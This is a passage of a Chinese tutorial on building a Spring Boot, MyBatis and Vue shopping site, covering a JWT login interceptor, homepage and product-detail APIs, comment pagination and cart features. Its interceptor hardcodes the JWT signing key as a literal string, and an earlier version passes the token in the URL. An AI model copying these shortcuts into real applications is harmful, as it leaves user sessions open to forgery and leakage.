CheckTokenInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String token = request.getParameter(\"token\"); if(token == null){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); //提示请先登录 doResponse(response,resultVO); }else{ try { //验证token JwtParser parser = Jwts.parser(); //解析token的SigningKey必须和生成token时设置密码一致 parser.setSigningKey(\"QIANfeng6666\"); //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); return true; }catch (ExpiredJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"登录过期，请重新登录！\", null); doResponse(response,resultVO); }catch (UnsupportedJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"Token不合法，请自重！\", null); doResponse(response,resultVO); }catch (Exception e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); doResponse(response,resultVO); } } return false; } private void doResponse(HttpServletResponse response,ResultVO resultVO) throws IOException { response.setContentType(\"application/json\"); response.setCharacterEncoding(\"utf-8\"); PrintWriter out = response.getWriter(); String s = new ObjectMapper().writeValueAsString(resultVO); out.print(s); out.flush(); out.close(); } } 配置拦截器 @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(\"/**\") .excludePathPatterns(\"/user/**\"); } } 7.5 请求头传递token 前端但凡访问受限资源，都必须携带token发送请求；token可以通过请求行(params)、请求头（header）以及请求体（data）传递，但是习惯性使用header传递 7.5.1 axios通过请求头传值axios({ method:\"get\", url:baseUrl+\"shopcart/list\", headers:{ token:this.token } }).then(function(res){ console.log(res); }); 7.5.2 在拦截器中放行options请求@Component public class CheckTokenInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //放行options请求 String method = request.getMethod(); if(\"OPTIONS\".equalsIgnoreCase(method)){ return true; } String token = request.getHeader(\"token\"); System.out.println(\"-------------\"+token); if(token == null){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); //提示请先登录 doResponse(response,resultVO); }else{ try { //验证token JwtParser parser = Jwts.parser(); //解析token的SigningKey必须和生成token时设置密码一致 parser.setSigningKey(\"QIANfeng6666\"); //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); return true; }catch (ExpiredJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"登录过期，请重新登录！\", null); doResponse(response,resultVO); }catch (UnsupportedJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"Token不合法，请自重！\", null); doResponse(response,resultVO); }catch (Exception e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); doResponse(response,resultVO); } } return false; } private void doResponse(HttpServletResponse response,ResultVO resultVO) throws IOException { response.setContentType(\"application/json\"); response.setCharacterEncoding(\"utf-8\"); PrintWriter out = response.getWriter(); String s = new ObjectMapper().writeValueAsString(resultVO); out.print(s); out.flush(); out.close(); } } 八、首页—轮播图8.1 实现流程分析 流程图 接口 查询轮播图信息返回 8.2 完成后台接口开发8.2.1 数据库操作实现 分析数据表结构 添加测试数据 编写sql语句 select img_id, img_url, img_bg_color, prod_id, category_id, index_type, seq, status, create_time, update_time from index_img where status=1 order by seq 在Mapper接口（DAO）中定义操作方法 public interface IndexImgMapper extends GeneralDAO&lt;IndexImg&gt; { //1.查询轮播图信息： 查询status=1 且 按照seq进行排序 public List&lt;IndexImg&gt; listIndexImgs(); } 配置映射文件 &lt;!--BaseResultMap是由逆向工程生成的--&gt; &lt;select id=\"listIndexImgs\" resultMap=\"BaseResultMap\"&gt; select img_id, img_url, img_bg_color, prod_id, category_id, index_type, seq, status, create_time, update_time from index_img where status=1 order by seq &lt;/select&gt; 8.2.2 业务层实现 IndexImgService接口 public interface IndexImgService { public ResultVO listIndexImgs(); } IndexImgServiceImpl实现类 @Service public class IndexImgServiceImpl implements IndexImgService { @Autowired private IndexImgMapper indexImgMapper; public ResultVO listIndexImgs() { List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs(); if(indexImgs.size()==0){ return new ResultVO(ResStatus.NO,\"fail\",null); }else{ return new ResultVO(ResStatus.OK,\"success\",indexImgs); } } } 8.2.3 控制层实现 IndexController类 @RestController @CrossOrigin @RequestMapping(\"/index\") @Api(value = \"提供首页数据显示所需的接口\",tags = \"首页管理\") public class IndexController { @Autowired private IndexImgService indexImgService; @GetMapping(\"/indeximg\") @ApiOperation(\"首页轮播图接口\") public ResultVO listIndexImgs(){ return indexImgService.listIndexImgs(); } } 8.3 完成前端功能 当进入到index.html，在进行页面初始化之后，就需要请求轮播图数据进行轮播图的显示 index.html 九、首页-分类列表9.1 实现流程分析 方案一：一次性查询三级分类 优点：只需要一次查询，根据一级分类显示二级分类时响应速度较快 缺点：数据库查询效率较低，页面首次加载的速度也相对较慢 方案二：先只查询一级分类，用户点击/鼠标移动到一级分类，动态加载二级分类 优点：数据库查询效率提高，页面首次加载速度提高 缺点：需要多次连接数据库 9.2 接口开发9.2.1 数据库操作实现 数据表结构 添加测试数据 编写接口实现所需的SQL 连接查询 select c1.category_id 'category_id1', c1.category_name 'category_name1', c1.category_level 'category_level1', c1.parent_id 'parent_id1', c1.category_icon 'category_icon1', c1.category_slogan 'category_slogan1', c1.category_pic 'category_pic1', c1.category_bg_color 'category_bg_color1', c2.category_id 'category_id2', c2.category_name 'category_name2', c2.category_level 'category_level2', c2.parent_id 'parent_id2', c3.category_id 'category_id3', c3.category_name 'category_name3', c3.category_level 'category_level3', c3.parent_id 'parent_id3' from category c1 inner join category c2 on c2.parent_id=c1.category_id left join category c3 on c3.parent_id=c2.category_id where c1.category_level=1 子查询 -- 根据父级分类的id查询类别信息 select * from category where parent_id=3; 创建用于封装查询的类别信息的CategoryVO 在beans子工程的entity包新建一个CategoryVO用于封装查询到类别信息，相对于Category来说，新增了如下属性： public class CategoryVO { //用于存放当前分类的子分类 private List&lt;CategoryVO&gt; categories; public List&lt;CategoryVO&gt; getCategories() { return categories; } } 在CategoryMapper定义操作方法 @Repository public interface CategoryMapper extends GeneralDAO&lt;Category&gt; { //1.连接查询 public List&lt;CategoryVO&gt; selectAllCategories(); //2.子查询：根据parentId查询子分类 public List&lt;CategoryVO&gt; selectAllCategories2(int parentId); } 映射配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.CategoryMapper\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.qfedu.fmmall.entity.Category\"&gt; &lt;id column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;/resultMap&gt; &lt;resultMap id=\"categoryVOMap\" type=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id1\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name1\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level1\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id1\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon1\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan1\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic1\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color1\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;collection property=\"categories\" ofType=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id2\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name2\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level2\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id2\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;collection property=\"categories\" ofType=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id3\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name3\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level3\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id3\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;/collection&gt; &lt;/collection&gt; &lt;/resultMap&gt; &lt;select id=\"selectAllCategories\" resultMap=\"categoryVOMap\"&gt; select c1.category_id 'category_id1', c1.category_name 'category_name1', c1.category_level 'category_level1', c1.parent_id 'parent_id1', c1.category_icon 'category_icon1', c1.category_slogan 'category_slogan1', c1.category_pic 'category_pic1', c1.category_bg_color 'category_bg_color1', c2.category_id 'category_id2', c2.category_name 'category_name2', c2.category_level 'category_level2', c2.parent_id 'parent_id2', c3.category_id 'category_id3', c3.category_name 'category_name3', c3.category_level 'category_level3', c3.parent_id 'parent_id3' from category c1 inner join category c2 on c2.parent_id=c1.category_id left join category c3 on c3.parent_id=c2.category_id where c1.category_level=1 &lt;/select&gt; &lt;!----------------------------------------------------------------------------&gt; &lt;resultMap id=\"categoryVOMap2\" type=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;collection property=\"categories\" column=\"category_id\" select=\"com.qfedu.fmmall.dao.CategoryMapper.selectAllCategories2\"/&gt; &lt;/resultMap&gt; &lt;!-- 根据父级分类的id查询子级分类 --&gt; &lt;select id=\"selectAllCategories2\" resultMap=\"categoryVOMap2\"&gt; select category_id, category_name, category_level, parent_id, category_icon, category_slogan, category_pic, category_bg_color from category where parent_id=#{parentId} &lt;/select&gt; &lt;/mapper&gt; 9.2.2 业务层实现 CategoryService接口 public interface CategoryService { public ResultVO listCategories(); } CategoryServiceImpl @Service public class CategoryServiceImpl implements CategoryService { @Autowired private CategoryMapper categoryMapper; public ResultVO listCategories() { List&lt;CategoryVO&gt; categoryVOS = categoryMapper.selectAllCategories(); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", categoryVOS); return resultVO; } } 9.2.3 控制层实现 IndexController @Autowired private CategoryService categoryService; @GetMapping(\"/category-list\") @ApiOperation(\"商品分类查询接口\") public ResultVO listCatetory(){ return categoryService.listCategories(); } 9.3 前端功能实现十、首页-商品推荐10.1 流程分析 10.2 接口开发10.2.1 数据库实现 商品推荐算法：推荐最新上架的商品 说明：商品推荐算法是根据多个维度进行权重计算，计算出一个匹配值 数据表分析及数据准备 sql -- 商品推荐：查询最新上架的商品 select * from product order by create_time desc limit 0,3; -- 子查询：根据商品id查询商品图片 select * from product_img where item_id=2; 在beans子工程entity包创建ProductVO,相比较Product新增了List imgs用于存储商品的图片 public class ProductVO{ private List&lt;ProductImg&gt; imgs; public List&lt;ProductImg&gt; getImgs() { return imgs; } public void setImgs(List&lt;ProductImg&gt; imgs) { this.imgs = imgs; } } Mapper接口定义操作方法： ProductMapper public interface ProductMapper extends GeneralDAO&lt;Product&gt; { public List&lt;ProductVO&gt; selectRecommendProducts(); } ProductImgMapper public interface ProductImgMapper extends GeneralDAO&lt;ProductImg&gt; { //根据商品id查询当前商品的图片信息 public List&lt;ProductImg&gt; selectProductImgByProductId(int productId); } 配置映射文件 ProductMapper.xml &lt;resultMap id=\"ProductVOMap\" type=\"com.qfedu.fmmall.entity.ProductVO\"&gt; &lt;id column=\"product_id\" jdbcType=\"VARCHAR\" property=\"productId\" /&gt; &lt;result column=\"product_name\" jdbcType=\"VARCHAR\" property=\"productName\" /&gt; &lt;result column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"root_category_id\" jdbcType=\"INTEGER\" property=\"rootCategoryId\" /&gt; &lt;result column=\"sold_num\" jdbcType=\"INTEGER\" property=\"soldNum\" /&gt; &lt;result column=\"product_status\" jdbcType=\"INTEGER\" property=\"productStatus\" /&gt; &lt;result column=\"create_time\" jdbcType=\"TIMESTAMP\" property=\"createTime\" /&gt; &lt;result column=\"update_time\" jdbcType=\"TIMESTAMP\" property=\"updateTime\" /&gt; &lt;result column=\"content\" jdbcType=\"LONGVARCHAR\" property=\"content\" /&gt; &lt;collection property=\"imgs\" select=\"com.qfedu.fmmall.dao.ProductImgMapper.selectProductImgByProductId\" column=\"product_id\"/&gt; &lt;/resultMap&gt; &lt;select id=\"selectRecommendProducts\" resultMap=\"ProductVOMap\"&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product order by create_time desc limit 0,3 &lt;/select&gt; ProductImgMapper.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.ProductImgMapper\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.qfedu.fmmall.entity.ProductImg\"&gt; &lt;id column=\"id\" jdbcType=\"VARCHAR\" property=\"id\" /&gt; &lt;result column=\"item_id\" jdbcType=\"VARCHAR\" property=\"itemId\" /&gt; &lt;result column=\"url\" jdbcType=\"VARCHAR\" property=\"url\" /&gt; &lt;result column=\"sort\" jdbcType=\"INTEGER\" property=\"sort\" /&gt; &lt;result column=\"is_main\" jdbcType=\"INTEGER\" property=\"isMain\" /&gt; &lt;result column=\"created_time\" jdbcType=\"TIMESTAMP\" property=\"createdTime\" /&gt; &lt;result column=\"updated_time\" jdbcType=\"TIMESTAMP\" property=\"updatedTime\" /&gt; &lt;/resultMap&gt; &lt;select id=\"selectProductImgByProductId\" resultMap=\"BaseResultMap\"&gt; select id, item_id, url, sort, is_main, created_time, updated_time from product_img where item_id=#{productId} &lt;/select&gt; &lt;/mapper&gt; 10.2.2 业务层实现 ProductService接口 public interface ProductService { public ResultVO listRecommendProducts(); } ProductServiceImpl实现类 @Service public class ProductServiceImpl implements ProductService { @Autowired private ProductMapper productMapper; public ResultVO listRecommendProducts() { List&lt;ProductVO&gt; productVOS = productMapper.selectRecommendProducts(); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", productVOS); return resultVO; } } 10.2.3 控制层实现 IndexController @Autowired private ProductService productService; @GetMapping(\"/list-recommends\") @ApiOperation(\"查询推荐商品接口\") public ResultVO listRecommendProducts() { return productService.listRecommendProducts(); } 10.3 前端实现十一、首页-分类商品推荐 按照商品的分类（一级分类）推荐销量最高的6个商品 11.1 流程分析 加载分类商品推荐有两种实现方案： 方案一：当加载首页面时不加载分类的推荐商品，监听进度条滚动事件，当进度条触底（滚动指定的距离）就触发分类推荐商品的加载，每次只加载一个分类的商品。 方案二：一次性加载所有分类的推荐商品，整体进行初始化。 11.2 接口实现11.2.1 数据库实现 数据准备 -- 添加商品 -- 添加十个分类下的商品： insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('5','商品5',10,1,122,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('6','商品6',10,1,123,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('7','商品7',10,1,124,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('8','商品8',10,1,125,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('9','商品9',10,1,126,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('10','商品10',10,1,127,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('11','商品11',10,1,128,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('12','商品12',46,2,122,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('13','商品13',46,2,123,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('14','商品14',46,2,124,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('15','商品15',46,2,125,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('16','商品16',46,2,126,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('17','商品17',46,2,127,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('18','商品18',46,2,128,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); -- 添加商品图片 insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('9','5','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('10','6','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('11','7','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('12','8','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('13','9','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('14','10','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('15','11','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('16','12','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('17','13','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('18','14','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('19','15','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('20','16','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('21','17','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('22','18','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); 查询SQL -- 查询所有的一级分类 select * from category where category_level=1; -- 查询每个分类下销量前6的商品 select * from product where root_category_id=2 order by sold_num desc limit 0,6; -- 查询每个商品的图片 select * from product_img where item_id = 1; 实体类： @Data @NoArgsConstructor @AllArgsConstructor @ToString public class CategoryVO { private Integer categoryId; private String categoryName; private Integer categoryLevel; private Integer parentId; private String categoryIcon; private String categorySlogan; private String categoryPic; private String categoryBgColor; //实现首页的类别显示 private List&lt;CategoryVO&gt; categories; //实现首页分类商品推荐 private List&lt;ProductVO&gt; products; } 在Mapper接口中定义查询方法 CategoryMapper ProductMapper 映射配置 ProductMapper.xml CategoryMapper.xml 11.2.2 业务层实现11.2.3 控制层实现11.3 前端实现十二、商品详情展示—显示商品基本信息 点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面 12.1 流程分析 12.2 商品基础信息-接口实现 商品基本信息、商品套餐、商品图片 SQL -- 根据id查询商品基本信息 select * from product where product_id=3; -- 根据商品id查询当前商品的图片（√） select * from product_img where item_id=3; -- 根据商品id查询当前商品的套餐 select * from product_sku where product_id=3; 因为上述的三个查询都是单表查询，可以通过tkmapper完成，无需在Mapper接口定义新的方法 业务层实现 ProductService接口 ProductServiceImpl类实现 控制层实现 ProductController类 12.3 商品基础信息-前端显示十三、商品详情展示—显示商品参数信息13.1 接口实现 根据商品id查询商品参数信息 数据库操作直接只用tkMapper的默认方法实现 业务层实现 控制层实现 13.2 前端显示商品参数13.3 前端显示商品细节前端页面间URL传值 utils.js function getUrlParam(key){ var url = decodeURI( window.location.toString() ); var arr = url.split(\"?\"); if(arr.length&gt;1){ var params = arr[1].split(\"&amp;\"); for(var i=0; i&lt;params.length; i++){ var param = params[i]; //\"pid=101\" if(param.split(\"=\")[0] == key ){ return param.split(\"=\")[1]; } } } return null; } a.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"b.html?pid=101&amp;pname=咪咪虾条\"&gt;跳转到B页面&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; b.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; This is Page B... &lt;hr/&gt; &lt;script type=\"text/javascript\" src=\"js/utils.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var pid = getUrlParam(\"pid\"); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 十四、商品详情展示—显示商品评论信息14.1 接口实现14.1.1 数据库实现 数据表分析及数据准备 SQL -- 根据ID查询商品的评价信息，关联查询评价用户的信息 select u.username,u.nickname,u.user_img,c.* from product_comments c INNER JOIN users u ON u.user_id = c.user_id WHERE c.product_id =3; 实体类封装ProductCommentsVO @Data @AllArgsConstructor @NoArgsConstructor public class ProductCommentsVO { private String commId; private String productId; private String productName; private String orderItemId; private Integer isAnonymous; private Integer commType; private Integer commLevel; private String commContent; private String commImgs; private Date sepcName; private Integer replyStatus; private String replyContent; private Date replyTime; private Integer isShow; //封装评论对应的用户数据 private String userId; private String username; private String nickname; private String userImg; } 在Mapper接口定义查询方法 @Repository public interface ProductCommentsMapper extends GeneralDAO&lt;ProductComments&gt; { public List&lt;ProductCommentsVO&gt; selectCommontsByProductId(String productId); } 映射配置： 14.1.2 业务层实现 创建ProductCommontsService接口定义方法 public interface ProductCommontsService { public ResultVO listCommontsByProductId(String productId); } 创建实现类ProductCommontsServiceImpl实现查询操作 @Service public class ProductCommontsServiceImpl implements ProductCommontsService { @Autowired private ProductCommentsMapper productCommentsMapper; @Override public ResultVO listCommontsByProductId(String productId) { List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", productCommentsVOS); return resultVO; } } 14.1.3 控制层实现 ProductController @ApiOperation(\"商品评论信息查询接口\") @GetMapping(\"/detail-commonts/{pid}\") public ResultVO getProductCommonts(@PathVariable(\"pid\") String pid){ return productCommontsService.listCommontsByProductId(pid); } 14.2 前端评论内容显示十五、商品详情展示—商品评论分页及统计信息15.1 流程分析 15.2 接口开发15.2.1 改造商品评论列表接口 分页查询 定义PageHelper @Data @NoArgsConstructor @AllArgsConstructor public class PageHelper&lt;T&gt; { //总记录数 private int count; //总页数 private int pageCount; //分页数据 private List&lt;T&gt; list; } 改造数据库操作 ProductCommentsMapper 接口 ProductCommentsMapper.xml映射配置 改造业务逻辑层 ProductCommontsService接口 ProductCommontsServiceImpl 改造控制层 ProductController 15.2.2 评价统计接口实现 数据库实现 统计当前商品的总记录数 统计当前商品的好评/中评/差评 业务层实现: ProductCommontsServiceImpl @Override public ResultVO getCommentsCountByProductId(String productId) { //1.查询当前商品评价的总数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"productId\",productId); int total = productCommentsMapper.selectCountByExample(example); //2.查询好评评价数 criteria.andEqualTo(\"commType\",1); int goodTotal = productCommentsMapper.selectCountByExample(example); //3.查询好评评价数 Example example1 = new Example(ProductComments.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(\"productId\",productId); criteria1.andEqualTo(\"commType\",0); int midTotal = productCommentsMapper.selectCountByExample(example1); //4.查询好评评价数 Example example2 = new Example(ProductComments.class); Example.Criteria criteria2 = example2.createCriteria(); criteria2.andEqualTo(\"productId\",productId); criteria2.andEqualTo(\"commType\",-1); int badTotal = productCommentsMapper.selectCountByExample(example2); //5.计算好评率 double percent = (Double.parseDouble(goodTotal+\"\") / Double.parseDouble(total+\"\") )*100; String percentValue = (percent+\"\").substring(0,(percent+\"\").lastIndexOf(\".\")+3); HashMap&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"total\",total); map.put(\"goodTotal\",goodTotal); map.put(\"midTotal\",midTotal); map.put(\"badTotal\",badTotal); map.put(\"percent\",percentValue); ResultVO success = new ResultVO(ResStatus.OK, \"success\", map); return success; } 15.3 前端实现15.3.1 商品评论的分页 引用elementUI分页组件 &lt;!-- 引入样式 --&gt; &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\"&gt; &lt;!-- vue的引入必须在elementUI组件库引入之前 --&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\"&gt;&lt;/script&gt; &lt;!-- 引入组件库 --&gt; &lt;script src=\"https://unpkg.com/element-ui/lib/index.js\"&gt;&lt;/script&gt; 引用分页组件 &lt;!--分页 --&gt; &lt;el-pagination background layout=\"prev, pager, next\" :current-page=\"pageNum\" :page-size=\"limit\" :total=\"count\" @current-change=\"pager\"&gt; &lt;/el-pagination&gt; 监听分页组件的页码改变事件（点击上一页、下一页、页码都会导致页码改变） 分页组件的事件函数默认传递当前页码参数 pager:function(currentPage){ this.pageNum = currentPage; //请求下一页数据 var url3 = baseUrl+\"product/detail-commonts/\"+this.productId; axios.get(url3,{ params:{ pageNum:this.pageNum, limit:this.limit } }).then((res)=&gt;{ //获取到评论分页数据 var pageHelper = res.data.data; //当前页的评论列表 this.productCommonts = pageHelper.list; //总页数 this.pageCount = pageHelper.pageCount; //总记录数 this.count = pageHelper.count; }); } 15.3.2 商品评价统计十六、购物车—添加购物车（登陆状态）16.1 流程分析 16.2 接口实现16.2.1 修改购物车数据表结构 shopping_cart 数据表修改完成之后，对此表重新进行逆向工程 16.2.2 数据库实现 单表添加操作，可以直接使用tkMapper完成 16.2.3 业务层实现 ShoppingCartService接口 public interface ShoppingCartService { public ResultVO addShoppingCart(ShoppingCart cart); } 实现类 16.3 前端实现16.3.1 记录选择的套餐属性 在vue的data中定义 chooseSkuProps 为sku的属性添加点击事件 在methods中定义事件函数changeProp 添加套餐切换的监听事件： 16.3.2 套餐属性选中效果 在套餐属性标签上添加name属性 在属性的点击事件函数实现选中效果 16.3.3 修改商品数量 在vue的data中定义num存储商品数量（默认值为1） 为+，-添加点击事件监听 定义点击事件函数 16.3.4 提交购物车 十七、购物车—添加购物车（未登录状态）17.1 流程分析 17.2 功能实现17.2.1 定义新的状态码 ResStatus 登录认证拦截器 17.2.2 